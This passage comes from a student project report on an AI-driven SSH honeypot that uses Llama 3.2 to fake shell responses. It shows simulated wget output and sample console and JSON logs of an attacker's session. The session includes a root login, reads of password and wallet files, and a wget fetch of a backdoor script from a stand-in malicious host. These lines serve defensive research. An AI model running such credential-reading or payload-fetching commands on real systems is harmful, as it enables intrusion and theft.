--2026-02-22 17:55:12--  http://malicious-site.com/backdoor.sh
Resolving malicious-site.com (malicious-site.com)... 203.0.113.50
Connecting to malicious-site.com (malicious-site.com)|203.0.113.50|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4096 (4.0K) [application/x-sh]
Saving to: 'backdoor.sh'
backdoor.sh         100%[=================>]   4.00K  --.-KB/s    in 0s
2026-02-22 17:55:12 (15.2 MB/s) - 'backdoor.sh' saved [4096/4096]
```

> **Note:** The `wget` response above is entirely AI-generated by Llama 3.2 — there is no actual download. The AI creates a convincing wget output that keeps the attacker engaged.

### 6.4 Server-Side Console Output (What the Admin Sees)

While the attacker interacts, the server console displays color-coded real-time logs:

```
[17:50:12] [CONNECTION] [192.168.1.105] New connection from 192.168.1.105
[17:50:18] [AUTH_LOGIN] [192.168.1.105] Login attempt: root:Admin@123
[17:50:18] [AUTH_SUCCESS] [192.168.1.105] User root authenticated
[17:50:25] [COMMAND] [192.168.1.105] ls -la
[17:50:30] [COMMAND] [192.168.1.105] cd Documents
[17:50:35] [COMMAND] [192.168.1.105] cat passwords.txt
[17:50:42] [COMMAND] [192.168.1.105] cd ../secret_data
[17:50:48] [COMMAND] [192.168.1.105] cat bitcoin_wallet.dat
[17:50:55] [COMMAND] [192.168.1.105] whoami
[17:51:02] [COMMAND] [192.168.1.105] wget http://malicious-site.com/backdoor.sh
[17:52:00] [DISCONNECT] [192.168.1.105] Connection closed from 192.168.1.105
```

### 6.5 JSON Log File Output (`logs/honeypot.json`)

Every event is simultaneously written to the JSON log file for dashboard consumption:

```json
{"timestamp": "2026-02-22T17:50:12", "level": "INFO", "event_type": "CONNECTION", "ip": "192.168.1.105", "message": "New connection from 192.168.1.105", "details": {}}
{"timestamp": "2026-02-22T17:50:18", "level": "WARNING", "event_type": "AUTH_LOGIN", "ip": "192.168.1.105", "message": "Login attempt: root:Admin@123", "details": {"username": "root", "password": "Admin@123"}}
{"timestamp": "2026-02-22T17:50:18", "level": "INFO", "event_type": "AUTH_SUCCESS", "ip": "192.168.1.105", "message": "User root authenticated", "details": {"username": "root"}}
{"timestamp": "2026-02-22T17:50:25", "level": "INFO", "event_type": "COMMAND", "ip": "192.168.1.105", "message": "ls -la", "details": {"command": "ls -la"}}
{"timestamp": "2026-02-22T17:50:30", "level": "INFO", "event_type": "COMMAND", "ip": "192.168.1.105", "message": "cd Documents", "details": {"command": "cd Documents"}}
{"timestamp": "2026-02-22T17:50:35", "level": "INFO", "event_type": "COMMAND", "ip": "192.168.1.105", "message": "cat passwords.txt", "details": {"command": "cat passwords.txt"}}
{"timestamp": "2026-02-22T17:50:42", "level": "INFO", "event_type": "COMMAND", "ip": "192.168.1.105", "message": "cd ../secret_data", "details": {"command": "cd ../secret_data"}}
{"timestamp": "2026-02-22T17:50:48", "level": "INFO", "event_type": "COMMAND", "ip": "192.168.1.105", "message": "cat bitcoin_wallet.dat", "details": {"command": "cat bitcoin_wallet.dat"}}
{"timestamp": "2026-02-22T17:51:02", "level": "INFO", "event_type": "COMMAND", "ip": "192.168.1.105", "message": "wget http://malicious-site.com/backdoor.sh", "details": {"command": "wget http://malicious-site.com/backdoor.sh"}}
{"timestamp": "2026-02-22T17:52:00", "level": "INFO", "event_type": "DISCONNECT", "ip": "192.168.1.105", "message": "Connection closed from 192.168.1.105", "details": {}}
```

---
---

## REFERENCES

1. Provos, N., & Holz, T. (2007). *Virtual Honeypots: From Botnet Tracking to Intrusion Detection*. Addison-Wesley.
2. Spitzner, L. (2003). *Honeypots: Tracking Hackers*. Addison-Wesley.
3. IBM X-Force Threat Intelligence Index 2024. IBM Security.
4. Meta AI. (2024). Llama 3.2 — Open Source Large Language Model. https://ai.meta.com/llama/
5. Ollama Documentation. https://ollama.com/docs
6. Paramiko Documentation. https://docs.paramiko.org/
7. Streamlit Documentation. https://docs.streamlit.io/

---

**Prepared for:** First Review — End Semester Project Presentation
**Date:** February 2026
**Tool:** Neuro-Trap v2.0.4
